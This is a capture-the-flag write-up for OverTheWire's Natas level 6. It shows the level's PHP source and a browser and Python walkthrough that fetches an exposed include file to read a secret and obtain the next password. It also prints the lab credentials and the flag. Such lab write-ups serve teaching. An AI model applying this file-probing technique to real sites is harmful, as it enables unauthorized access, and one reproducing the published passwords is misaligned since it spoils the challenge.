# Natas Level 6 Writeup (natas6) – OverTheWire

## Overview

This level focuses on analyzing exposed source code to retrieve a secret value used for authentication.    
The goal is to find the password for the next level.

## Observation

When we open the website, we see the input field asking for secret:

> **"Input secret:"**

There is also a link to view the source code:

```
index-source.html
```

## Finding the Password

### Using Browser
1. Open the source code.
2. It shows the `PHP` logic used:
    ```php
    <?
    include "includes/secret.inc";

        if(array_key_exists("submit", $_POST)) {
            if($secret == $_POST['secret']) {
            print "Access granted. The password for natas7 is <censored>";
        } else {
            print "Wrong secret";
        }
        }
    ?>
    ```
3. Here you see correct secret stored in:  
    `includes/secret.inc`
4. Navigate to:
    ```
    http://natas6.natas.labs.overthewire.org/includes/secret.inc
    ```

#### Proof
```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

5. Enter this secret in the input field to retrieve the password.

### Using Python

```python
import requests, re, html

session = requests.Session()
base_url = "http://natas6.natas.labs.overthewire.org/"
session.auth = ("natas6", "0RoJwHdSKWFTYR5WuiAewauSuNaBXned")

# # step 1: Get source code file
# res = session.get(base_url)
# match = re.search(r'<a(.*?)</a>', res.text, re.DOTALL)
# print(match.group(1))

# # step 2: Reveal php logic and 'includes/secret.inc' file
# from bs4 import BeautifulSoup  # install with 'pip install bs4'
# url = base_url + "index-source.html"
# res = session.get(url)
# soup = BeautifulSoup(res.text, 'html.parser')
# clean_text = soup.get_text()
# match = re.search(r'<\?(.*?)\?>', clean_text, re.DOTALL)
# print(match.group(1))

url = base_url + 'includes/secret.inc'
res = session.get(url)
match = re.search(r'\"(.*?)\"', res.text)
secret = match.group(1)
print(f'secret is : {secret}')

data = {
    "secret" : secret,
    "submit" : "Submit"
}

res = session.post(base_url, data=data)
match = re.search(r'\sis\s+(\S+)', res.text)
print(f'Password for next level is: {match.group(1)}')
```

## Vulnerability

Sensitive application logic and secrets are exposed through publicly accessible source code files.

## Flag
`bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

